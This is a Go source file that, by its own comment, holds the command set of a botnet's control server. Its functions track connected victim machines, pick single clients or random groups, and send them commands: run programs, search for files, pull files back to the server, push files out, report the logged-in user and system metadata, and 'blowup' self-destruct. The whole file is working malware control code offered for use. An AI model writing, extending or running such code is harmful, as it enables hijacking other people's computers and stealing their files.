package connection

import (
	"fmt"
	h "server/util/header"
)

/*
*All the commands that the botnet can run
*/

//*Shows number of all active connection to server
func (s *Server) ShowActiveConns(){
	s.mu.Lock()
	defer s.mu.Unlock()
	fmt.Println(h.I, s.ActiveConns, "Client(s) currently connected")
}

//*Lists all client IPs connected to the server
func (s *Server) ListClients() {
	s.mu.Lock()
	defer s.mu.Unlock()
	
	if len(s.Clients) == 0 {
		fmt.Println(h.E, "No Clients Connected")
		return
	}
	
	fmt.Println(h.I, "Current Clients Connected:")
	for _, client := range s.Clients {
		remoteAddr := client.Conn.RemoteAddr().String()

		disconnected := false
		select {
		case <-s.DisconnectedClients:
			disconnected = true
		default:
		}

		if !disconnected {
			fmt.Printf("\t"+h.L+" Client %d: %s\n", client.ID, remoteAddr)
		}
	}
}


//*Makes the selected ID the active Client
func (s *Server)SelectActiveClient(ID int64){
	if ID >= 0{
		s.ActiveClient = ID
		fmt.Println(h.K, "Active Client is now:", s.ActiveClient)
	}else{
		fmt.Println(h.E, "Invalid number")
	}
}

//*Prints current active client
func (s *Server)CheckActiveClient(){
	fmt.Println(h.I, "Current Active Client", s.ActiveClient)
}



/*
* Creates a group of Clients of amount size
* random clients are selected to be part of the group
*/
func (s *Server)SetClientGroup(amount int){	
	if amount < 0{
		fmt.Println(h.E, "Invalid amount")
		return
	}
	shuffledClients := s.Clients
	
	ShuffleList(shuffledClients)
	
	var newGroup []*Client

	for i := 0; i< amount && i < len(shuffledClients); i++{
		newGroup = append(newGroup, shuffledClients[i])
	}
	
	s.ClientGroup = newGroup

	fmt.Println(h.K, "random client group assigned")
}



//*Prints the current active client group
func (s *Server)CheckClientGroup(){
	if len(s.ClientGroup) == 0{
		fmt.Println(h.E, "The Client Group is empty")
		return
	}

	fmt.Println(h.I, "Current Client Group Members:")
	for _, c := range(s.ClientGroup){
		fmt.Println("\t", h.L, "Client:", c.ID)
	}
}


//*Pings address specified by input
func (s *Server) ClientPing(addr, mode string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode(mode, "ping " + addr, s)	
}


//*Runs specified app on detected os by abs path on client side
func (s *Server)ClientRunApp(app, mode string){
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode(mode, "run "+ app, s)
}



//*Sends a file to client side
func (s *Server)ServerSendFile(file, mode string){
	s.mu.Lock()
	defer s.mu.Unlock()

	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if err := s.SendFileToClient(file, client); err != nil {
					fmt.Println(h.E, "Error sending file to active client:", err)
				} else {
					fmt.Println(h.K, "File sent to active client", s.ActiveClient, "successfully.")
				}
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.ClientGroup {
			if err := s.SendFileToClient(file, client); err != nil {
				fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
			}
		}
		fmt.Println(h.K, "File Sent to group successfully")
	

	default:
		for _, client := range s.Clients {
			if err := s.SendFileToClient(file, client); err != nil {
				fmt.Println(h.E, "Error sending file to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "File sent to client", client.ID, "successfully.")
			}
		}
	}
}

//*Searches for a file on the client side
func (s *Server)ClientSearchFile(file, mode string){
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode(mode, "search " + file, s)
}

//*Tells client to return the current path that they are located in
func (s *Server)ClientEntryPoint(mode string){
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode(mode, "entry", s)
}


//*Downloads a file from client side to Server side
func (s *Server)ClientDownFile(file, mode string){
	s.mu.Lock()
	defer s.mu.Unlock()
	switch{
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if err := s.RecvFileFromClient(client, file); err != nil {
					fmt.Println(h.E, "Error sending Command to active client:", err)
				} else {
					fmt.Println(h.K, "Command sent to active client", s.ActiveClient, "successfully.")
				}
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.Clients {
			if err := s.RecvFileFromClient(client, file); err != nil {
				fmt.Println(h.E, "Error sending Command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "Command sent to client", client.ID, "successfully.")
			}
		}
		fmt.Println(h.K, "File Sent to group successfully")

	default:
		for _, client := range s.Clients {
			if err := s.RecvFileFromClient(client, file); err != nil {
				fmt.Println(h.E, "Error sending Command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, "Command sent to client", client.ID, "successfully.")
			}
		}
	}
}

//*Disconnects a clients connection to the server
func (s *Server)ClientSelfDestruct(mode string){
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode(mode, "blowup", s)
}

//*Returns metadata of client: operating system, connection, id
func (s *Server) GetMetaData(mode string){
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode(mode, "metadata", s)
}

//*Sends command to check to see if client is alive
func (s *Server) Echo(){
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode("", "echo", s)
}


//*Sends whoami command to client to see who the client is logged in as
func (s *Server) WhoAmI(mode string){
	s.mu.Lock()
	defer s.mu.Unlock()
	swMode(mode, "whoami", s)
}

//*helper function to wrap the methods inside of
func swMode(mode, command string, s *Server){
	switch{
	
	case mode == "-a":
		for _, client := range s.Clients {
			if client.ID == s.ActiveClient {
				if _, err := client.Conn.Write([]byte(command)); err != nil {
					fmt.Println(h.E, "Error sending ",command ," command to active client:", err)
				} else {
					fmt.Println(h.K, "",command ," command sent to active client", s.ActiveClient, "successfully.")
				}
			}
		}
	
	case len(s.ClientGroup) > 0 && mode == "-g":
		for _, client := range s.ClientGroup {
			if _, err := client.Conn.Write([]byte(command)); err != nil {
				fmt.Println(h.E, "Error sending ",command ," command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, command ,"command sent to client", client.ID, "successfully.")
			}
		}
		fmt.Println(h.K, command ,"command Sent to group successfully")

	default:
		for _, client := range s.Clients {
			if _, err := client.Conn.Write([]byte(command)); err != nil {
				fmt.Println(h.E, "Error sending",command ,"command to client", client.ID, ":", err)
			} else {
				fmt.Println(h.K, command ,"command sent to client", client.ID, "successfully.")
			}
		}
	}

}